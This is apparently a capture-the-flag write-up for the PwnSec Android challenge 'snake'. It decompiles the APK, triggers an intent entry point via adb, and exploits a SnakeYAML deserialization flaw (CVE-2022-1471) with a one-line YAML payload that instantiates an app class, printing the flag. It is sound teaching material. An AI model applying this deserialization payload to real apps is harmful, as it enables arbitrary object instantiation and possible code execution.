**Description**: Make sure to run the mobile application on Android API 28 or less (Android 9 or less).
**Download content**: https://lautarovculic.com/my_files/snake.zip

![[pwnSec_snake1.png]]

Install the **apk** with **ADB**.
**NOTE**
Ill use an **AVD** (Android Virtual Device) *non-rooted* from the **Android Studio** SDK.
```bash
adb install -r snake.apk
```

The *UI app* doesn't have nothing interesting. But is good notice that the **app ask for us about storage permissions**.
In fact, the **`AndroidManifest.xml`** file have
```XML
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

Let's decompile the app with **apktool**
```bash
apktool d snake.apk
```
And inspect the **source code** with **jadx** (GUI version)
The **MainActivity** has multiple *root detection*, *frida detection* and *storage permissions*.

The unique interesting code in this activity is the `C()` method:
```java
public final void C() {
    Intent intent = getIntent();
    String stringExtra = intent.getStringExtra("SNAKE");
    
    if (intent.hasExtra("SNAKE") && stringExtra.equals("BigBoss")) {
        File file = new File(new File(Environment.getExternalStorageDirectory(), "snake"), "Skull_Face.yml");
        
        if (!file.exists()) {
            Log.e("YML File", "File not found: " + file.getAbsolutePath());
            return;
        }
        
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            try {
                e eVar = new e(0);
                Object f2 = eVar.f(fileInputStream);
                Log.d("Skull Face data: ", f2.toString());
                eVar.c(f2);
            } finally {
                fileInputStream.close();
            }
        } catch (IOException e2) {
            Log.e("YML File", "Error reading file: ", e2);
        }
    }
}
```

Also, we have the **BigBoss** class, which is
```java
package com.pwnsec.snake;  
  
import android.util.Log;  
  
public class BigBoss {  
    static {  
        System.loadLibrary("snake");  
    }  
  
    public BigBoss(String str) {  
        String stringFromJNI = stringFromJNI(str);  
        if (str.equals("Snaaaaaaaaaaaaaake")) {  
            Log.d("BigBoss: ", hexToAscii(stringFromJNI));  
        }  
    }  
  
    private String hexToAscii(String str) {  
        StringBuilder sb = new StringBuilder();  
        int i2 = 0;  
        while (i2 < str.length()) {  
            int i3 = i2 + 2;  
            sb.append((char) Integer.parseInt(str.substring(i2, i3), 16));  
            i2 = i3;  
        }  
        return sb.toString();  
    }  
  
    public native String stringFromJNI(String str);  
}
```

We have an **intent** that we can call with **`am`** (Activity Manager) tool from **adb**.
This specific code
```java
Intent intent = getIntent();
String stringExtra = intent.getStringExtra("SNAKE");

if (intent.hasExtra("SNAKE") && stringExtra.equals("BigBoss")) {
    File file = new File(new File(Environment.getExternalStorageDirectory(), "snake"), "Skull_Face.yml");
    
    if (!file.exists()) {
        Log.e("YML File", "File not found: " + file.getAbsolutePath());
        return;
    }
}
```
Is the *entry point*.
We can run the following command for *start the app* with the *extra strings*
```bash
adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
```

In the *UI App* nothing change, but reading the code, if we run
```bash
adb logcat | grep "YML File"
```
We can notice that
```bash
12-10 00:01:08.258  9002  9002 E YML File: File not found: /storage/emulated/0/snake/Skull_Face.yml
```
The app expect a *file* called *`Skull_Face.yml`* in `/storage/emulated/0/snake/` directory.

Inspecting the **BigBoss** class, we can see that here's an **`SnakeYAML deserialization`**.
```java
public class BigBoss {  
    static {  
        System.loadLibrary("snake");  
    }  
  
    public BigBoss(String str) {  
        String stringFromJNI = stringFromJNI(str);  
        if (str.equals("Snaaaaaaaaaaaaaake")) {  
            Log.d("BigBoss: ", hexToAscii(stringFromJNI));  
        }  
    }  
  
    private String hexToAscii(String str) {  
        StringBuilder sb = new StringBuilder();  
        int i2 = 0;  
        while (i2 < str.length()) {  
            int i3 = i2 + 2;  
            sb.append((char) Integer.parseInt(str.substring(i2, i3), 16));  
            i2 = i3;  
        }  
        return sb.toString();  
    }  
  
    public native String stringFromJNI(String str);  
}
```

And, here's more information about this **CVE** (CVE-2022-1471)
https://www.veracode.com/blog/research/resolving-cve-2022-1471-snakeyaml-20-release-0

So, according to the article and vulnerability, we can use the following exploit:
```YML
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
```
This content must be saved in the `Skull_Face.yml` file that the app search for, which is `/storage/emulated/0/snake/`

Create the *folder* and the *file*. Then, run again the app with **ADB** and the *extra strings*
```bash
adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
```

Use **logcat** for see the flag
```bash
adb logcat | grep -i "PWNSEC"
```

Flag: **`PWNSEC{W3'r3_N0t_T00l5_0f_The_g0v3rnm3n7_0R_4ny0n3_3ls3}`**

I hope you found it useful (: